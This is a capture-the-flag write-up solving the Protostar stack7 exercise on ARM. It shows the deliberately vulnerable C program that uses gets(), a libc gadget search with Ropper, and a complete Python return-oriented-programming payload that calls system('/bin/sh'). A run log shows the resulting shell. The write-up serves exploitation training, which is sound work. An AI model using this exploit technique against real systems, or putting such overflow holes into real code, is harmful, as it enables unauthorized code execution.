## Protostar ARM ./stack7


#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define JUMP_GUARD 71

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);
  /**
  I replaced this piece of code because doesn't work in ARM neither changing
  the value of our stack (0x7efdf000)

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  The following lines of code are added in order to perform a trivial check and don't allow to jump in the stack

  */
  //printf ("Jump to : %x%x%x%x\n", buffer[JUMP_GUARD], buffer[72], buffer[73], buffer[74]);
  if( buffer[JUMP_GUARD] >= 0x7e && buffer[JUMP_GUARD] <=0x7f ) {
     printf("bzzzt... don't jump to the stack\n");
     _exit(1);
   }

  printf("got path %s\n", buffer);
  return strdup(buffer);

}

int main(int argc, char **argv)
{
  getpath();
}
```

#### _Let's start_

This challenge is pretty similar to the previous one, the only difference is the return, this time our vulnerable function returns `strdup()`.


As we can see the stack is not executable `0x7efdf000 0x7f000000 0x00000000 rw- [stack]` and `libc` starts at `0x76e6b000`.


The idea to solve the challenge is to write into the stack, addresses of instructions containted in `libc` in order to execute our code flow and obtain a shell. This technique is called `ROP` (Returned Oriented Programming), which is another technique to bypass `NX`.
We will use [Ropper](https://github.com/sashs/Ropper) and we will look for gadgets in `libc`.
Practically, in this small solution, we will replace the task performed from `nrand48`, from the previous challenge, with a series of instructions.

Let's summarise the idea in few steps:
1. find a gadget which allows us to set some values in registers
2. adapt the stack in order to "satisfy the gadgets" (we will see it in practice)
3. set a register with the address of the function `system()`
4. jump to the register set in the previous step

We we look for one or more instructions which allow us to get some values from the stack and store them into registers in order to accomplish our code flow.
The best candidate to solve this challenge seems to be a `POP` instruction.
According with the [ARM documentation](http://www.keil.com/support/man/docs/armasm/armasm_dom1361289885303.htm), a `POP` instruction is a synonym for `LDMIA sp! reglist`.

__*Example:*__  
`pop {rX,rY,rZ}` = `LDMIA sp!, {rX,rY,rZ}`  
Load registers `rX` , `rY` , `rZ`  with values starting from memory location with address given by `sp` . After each transfer increment `sp` by 4 and update `sp` at the end of the instruction.

We can use Ropper to find a `POP` instruction in `libc` to support us.

```code
pi@raspberrypi:~/protostar/stack7 $ ropper
(ropper)> file /lib/arm-linux-gnueabihf/libc-2.28.so    
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(libc-2.28.so/ELF/ARM)> search /1/ pop
[INFO] Searching for gadgets: pop
[INFO] File: /lib/arm-linux-gnueabihf/libc-2.28.so
0x0002bd40: pop {fp}; bx r3;
0x000fde98: pop {lr}; bx r3;
0x000da9c0: pop {r0, r1, r2, r3, ip, lr}; bx ip;
0x000791fc: pop {r0, r4, pc};
0x00119144: pop {r1, pc};
0x00119078: pop {r2, r3}; bx lr;
0x0006b8fc: pop {r4, lr}; bx r3;
0x00018164: pop {r4, pc};
0x00017a30: pop {r4, r5, lr}; bx r3;
0x0002c6dc: pop {r4, r5, pc};
0x00111d78: pop {r4, r5, r6, lr}; bx r2;
0x00061624: pop {r4, r5, r6, lr}; bx r3;
0x000170e0: pop {r4, r5, r6, pc};
0x0001790c: pop {r4, r5, r6, r7, pc};
0x00069084: pop {r4, r5, r6, r7, r8, lr}; bx r3;
0x000253b8: pop {r4, r5, r6, r7, r8, sb, sl, fp, lr}; bx r3;
0x0005e7e8: pop {r4, r5, r6, r7, r8, sb, sl, lr}; bx r1;
0x0008d42c: pop {r4, r5, r6, r7, r8, sb, sl, lr}; bx r3;
0x0006f9a0: pop {r4, r5, r6, r7, r8, sb, sl, pc}; blx r3;
0x0003b5f4: pop {r4, r5, r6, r7}; bx lr;
0x0002c29c: pop {r4, r5, r7, pc};
0x000cce7c: pop {r4, r5, r7}; bx lr;
0x0002b3d8: pop {r4, r5}; bx lr;
0x0002f07c: pop {r4, r6, r7, pc};
0x0002f61c: pop {r4, r7, pc};
0x0002c23c: pop {r7, pc};
0x0002f384: pop {r7}; bx lr;

(libc-2.28.so/ELF/ARM)>
```

Inspecting the results, the gadget `0x000791fc: pop {r0, r4, pc}`, seems to be a good candidate because in `r0` we will set the address of `'/bin/sh'`, about `r4` we don't care (we will set a value just to fill it) and in `pc` we will set the address of the `system()`.

According with the gadget found and what we read before about POP instruction, our stack should be something like this:


|STACK        |  Note           |
| :-------------: | :-------------: |
|_0x000791fc_| _address of our gadget_  |
|_0x76f96b73_| _`/bin/sh` address_  -> `r0`|
| _fill_ | 'BBBB' -> `r4`|
| _0x76ea39c8_|_`system()` address_ -> `pc` |
| ... | ... |

Let's write a Python script with above mentioned

```python
import struct

padding = 'A' * 68
filler = 'BBBB'

g_1 = 0x000791fc
"""
 pop {r0, r4, pc};
"""

bash = 0x76f96b6c
system =  0x76ea39c8
libc_base = 0x76e6b000

payload = padding
payload += struct.pack('<I', libc_base + g_1)
payload += struct.pack ('<I', bash)
payload += filler
payload += struct.pack ('<I', system)


print payload
```
and try it

```code
pi@raspberrypi:~/protostar/stack7 $ python gadget.py > gadget
pi@raspberrypi:~/protostar/stack7 $ cat gadget - | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�A�vlk�vBBBB�9�v
pwd
/home/pi/protostar/stack7
```
__*Done :)*__
